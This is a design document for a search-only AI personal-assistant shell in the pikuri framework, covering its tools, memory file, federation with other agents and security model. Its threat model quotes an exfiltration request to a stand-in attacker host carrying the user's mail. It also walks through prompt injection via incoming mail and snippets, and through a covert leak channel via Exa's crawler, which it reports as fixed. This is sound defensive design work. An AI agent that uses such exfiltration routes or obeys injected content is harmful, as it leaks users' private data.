# `pikuri-tui-secretary` — a search-only personal assistant

Goal: a fourth shell, a personal assistant in the shape of the new Siri. It can **search the web
but not open a URL**. It holds mail, calendar, contacts, documents (`~/Documents`), its own memory
file, and `web_search`. It has no `fetch`, no `web_scrape`, no sub-agents and **no `bash`**.

## A federation member, not a do-everything agent

No `bash`, decided. A bwrapped `bash` wouldn't break the egress story, but it is the one tool that
writes anywhere, so it would drag in the passive-command detector and the confirms. When the user
wants help with the machine itself, the secretary tells them to run `pikuri-tui-computer`.

That is pikuri's *federation* (`design/ideas/assistant.md` in pikuri): separate agents with
separate contexts, memories and toolsets, and **the human as the only router between them**.
Because the human authors what they carry across, trifecta legs don't propagate from one agent to
another, the opposite of a parent that dispatches to sub-agents. `pikuri-tui-computer` is already
the `@os` member, and the secretary would be the second one, as separate binaries rather than
`@`-addressed agents in one process. The point is to gather practice: does "go ask the other one"
feel natural, or does the user keep carrying text across by hand? What we learn goes back into
pikuri's federation idea.

The hand-off sentence is a prompt, and prompts are pikuri's. So the secretary's system prompt
lives upstream, next to the OS helper's. See `Q_prompt_home`.

The name is decided. A secretary does mail, calendar and notes, and *secretarius* means "the one
entrusted with secrets", which is this shell's security story. (`pikuri-assistant` is taken anyway,
by pikuri's MCP demo binary.)

## Why the shape is safe by construction

The computer shell keeps the web behind a quarantined `RESEARCHER` that you approve per task,
because `fetch` lets the *caller* choose the host: `GET https://evil.example/?d=<your mail>`. A
search-only agent has no such leg. Its only egress is a query to an engine this code picks, and
pikuri already grades it that way: `WebSearch.build` declares
`egress_payload_review: :unreviewed, egress_destination: :tool_vouched`. A secret can be pushed out
inside a query, but an attacker can't read it back.

What it still has:

- **Prompt injection, with nowhere to send its output.** Incoming mail, search snippets and
  anything downloaded into `~/Documents` are attacker-written (`untrusted: :hard`). An injection
  can still steer a draft or a memory edit. Both stay human-gated, so the human is the gate there.
- **Leaks to the provider.** A query that quotes your mail lands in Brave's or Exa's logs. Exa's
  ToS also grants it a perpetual license to train on queries (see the rdoc of pikuri's
  `Search::Exa`). That isn't exfiltration to an attacker, but it is a privacy cost. Hence the
  config switch below.
- **Usefulness.** Snippets only. For an assistant that's mostly enough, and for an obscure Linux
  error the Stack Overflow and GitHub issue titles often name the fix. Otherwise the user opens the
  link. pikuri's `WebSearch::DESCRIPTION` currently tells the model to follow up with
  `web_scrape`, which is wrong for this shell. See `Q_search_description`.

## Its promise (lands in AGENTS.md *Promises* on graduation)

"Talks only to the configured search engines. Every other outbound leg waits on a keystroke."
This must be a new shell, not a mode of `pikuri-tui-computer`. The computer shell promises that
*every* outbound leg waits on a keystroke, and an ungated search is outbound.

## Config: approve each search, or accept leaks to the engine

The user chooses one of two:

- **Confirm each search** (the private default?). The query goes through the transcript confirmer
  like a write does. The query *is* the bytes that leave, so the human reviews the real payload,
  and the leg becomes `egress_payload_review: :human_reviewed`.
- **Don't confirm.** Searches fly free, and the user accepts that private text may reach the
  engine's logs.

## Documents: `~/Documents`, in place of Siri's Notes

There's no system Notes app on Linux; `~/Documents` is the closest thing. It mixes what the user
wrote with what they downloaded, so the document tools declare `private: true, untrusted: :hard`.
That's fine, because egress stays vouched. Three ways to search it, and pikuri ships all three
already:

1. **Read-only workspace tools** (`read` / `glob` / `grep`) rooted at `~/Documents`. They're
   exact, always fresh, and scoped to the folder for free. `grep` is blind inside PDFs and office
   docs, but pikuri-pdf extracts text for `read`.
2. **The OS index**: pikuri-os's `fileindex_search` / `fileindex_read` over GNOME localsearch or
   recoll. PDFs and office docs come for free and it's stemmed. But localsearch can't be scoped to
   a folder: it ranks across the whole home, so hits from outside `~/Documents` arrive too. Recoll
   can be scoped with its own `topdirs`.
3. **Our own index**: pikuri-rag, which fuses SQLite FTS5 with vectors over "a pile of your own
   documents". It's the best answer for "what did we agree about X?", but it needs an embedder,
   and the index has to be kept current.

Lean: (1) as the baseline, plus (2) when the OS has an index. Try (3) once (1) proves too literal.
See `Q_documents_index`.

## Memory: a file like `MACHINE.md`, but its own

The computer shell's memory is pikuri-os's `MachineMemory`, which keeps one user-owned
`~/.config/pikuri/MACHINE.md`. It's prepended to the system prompt, re-read on `/clear`, and
written only through confirmed `write` / `edit` diffs. Its rdoc argues for a file over mem0:
untrusted input could poison auto-extracted memory, and a file keeps every change visible,
confirmed and reversible. That argument holds doubly here, since the secretary reads mail all day.

But the *subject* differs. `MACHINE.md` is about the host. The secretary's file is about the user:
people and who they are, preferences ("no meetings before 10"), routines, recurring addresses. So
it's a separate file: **`~/.config/pikuri/SECRETARY_NOTES.md`**, decided. It's named after its
owner, not its subject, because each federation member keeps its own memory. The computer shell
doesn't read it; anything that should cross over, the user carries.

What's missing upstream:

- `MachineMemory` takes a `path:`, but its prompt section is hard-wired to "Notes about this
  machine". The memory needs a subject-neutral pikuri primitive (or a sibling class).
- The secretary has no general write tools, so memory needs a write path confined to that one
  file and confirmed with a diff. That's a pikuri tool, maybe `remember` / an `edit` whose
  workspace is the single file.

## Research: can Exa become an attacker-reachable channel? (2026-11-10)

pikuri's Exa engine calls only `POST https://api.exa.ai/search`, with
`type: "auto", contents: { highlights: true }` and no freshness field
(`pikuri-core/lib/pikuri/tool/search/exa.rb`). It never calls `/contents` or `/findSimilar`, the
two endpoints that take caller-supplied URLs.

Exa's docs ([livecrawling contents](https://exa.ai/docs/reference/livecrawling-contents),
[Feb 2026 API updates](https://exa.ai/docs/changelog/february-2026-api-updates)):

- **With no freshness field, Exa may fetch pages live.** The default is "use cached content when
  available and fetch the page when needed", with a `livecrawlTimeout` of 10 s. So when Exa has no
  cached copy of a result page, its crawler fetches it at query time.
- **`maxAgeHours: -1` is cache-only** ("Only use cached content"). The deprecated
  `livecrawl: "never"` maps to it. Search `type: "lite"` (Oct 2026) "never fetches a page live"
  either.
- **The docs don't say** whether `/search` ever fetches a URL that appears in the *query text*.

The risk is a covert channel, not a direct send. The query picks which result pages match. An
attacker who owns pages in Exa's index, each matching a different secret-dependent query, sees in
their server logs which page Exa's crawler fetched. That leaks bits of the query to an attacker,
which breaks the third `:tool_vouched` clause ("not attacker-readable … at rest"). The channel is
narrow: the page must be indexed but have no cached contents, and a fetch caches it. But it exists,
and it's exactly the leg this shell's safety rests on.

**Fixed upstream in pikuri `fef8288` (2026-11-10), and pikuri-tui is bumped onto it.**
`Search::Exa.request_body` now sends `contents: { highlights: true, maxAgeHours: -1 }`. Exa's
`/search` schema puts `maxAgeHours` in `ContentsOptions`, `minimum: -1`, "`-1` always uses the
cache". So this shell can keep Exa. Brave and DuckDuckGo are
believed not to fetch the query or the result URLs on our behalf. That's unverified, but also
undocumented as a feature.

## v2, kept open: a researcher until the first private read

The idea: the secretary gets a `RESEARCHER` sub-agent that *can* fetch URLs, but only while its own
context is clean. The first private read (mail, calendar, documents) taints the context, and from
then on the researcher is gone until `/clear`. The system prompt says "research first". It's
sound: a task prompt written from a context with no private data in it can't carry any out.

That's pikuri's `design/ideas/private-context-taint.md`, designed but not built. A context becomes
private when the first `:private` tool returns into it, the flag never clears, and egress is
constrained from then on. So v2 waits on that primitive upstream, not on anything here.

Why usability is the open question:

- **An assistant's turns start private.** "Reply to John", "what's on Thursday": the first tool
  call reads mail or the calendar, and the model can't know a research need is coming.
- **The memory taints the session at turn 0.** `SECRETARY_NOTES.md` sits in the system prompt, so
  the context is private before the first message. Either the taint rule exempts the user's own
  memory, which is unsound if the agent wrote it from mail, or v2 drops memory from the prompt and
  serves it through a tool instead.
- **"Research first" asks the model to plan around a security rule**, which small local models do
  badly. The user will mostly meet it as "I can't look that up anymore, `/clear` and ask again".

Meanwhile, the federation already gives v1 a research path: `pikuri-tui-chat` holds the web tools.
The user researches there and carries the answer over. If v1 practice shows that hop is constant,
that's the evidence v2 is worth building. If it's rare, v2 isn't.

## Open questions

- `Q_search_confirm_default`: confirm searches by default? Privacy first says yes. The annoyance
  says no, because an assistant searches a lot.
- `Q_search_confirm_key`: where does the switch live? `[search]` is shared with chat, where it
  would mean nothing, so probably a `[secretary]` table with `confirm_searches = true`. A CLI flag
  too, like `--no-internet`?
- `Q_gate_primitive`: `WebSearch.build` takes no confirmer, so a gated search is a missing pikuri
  primitive (a `confirmer:` kwarg that also flips the leg to `:human_reviewed`), not a TUI-side
  wrapper.
- `Q_search_description`: `WebSearch::DESCRIPTION` pushes the model to `web_scrape`, a tool this
  shell won't have. pikuri needs a variant ("snippets are all you get") instead of a TUI-side
  rewrite, since prompts are pikuri's.
- `Q_prompt_home`: where does the secretary's system prompt live upstream? Options: a new
  `pikuri-secretary` gem, pikuri-assistant's `prompts/` (the federation's "likely home"), or beside
  pikuri-thunderbird. It carries the "for the machine, run pikuri-tui-computer" hand-off.
- `Q_documents_index`: workspace tools alone, or with the OS index (and then localsearch's
  whole-home scope or recoll's `topdirs`)? Is pikuri-rag worth an embedder?
- `Q_tools`: Thunderbird gives mail search/read, attachments, compose hand-off, calendar
  search/read/create and contacts. Keep `calendar_create` gated like compose. Add the calculator?
  (`system_info` stays the computer shell's, per the federation split.)
- `Q_trifecta_verdict`: what does pikuri's `/trifecta` report say about all three legs meeting with
  egress `:tool_vouched`? The shell should read as "broken by construction" there, not as a warning
  the user learns to ignore.
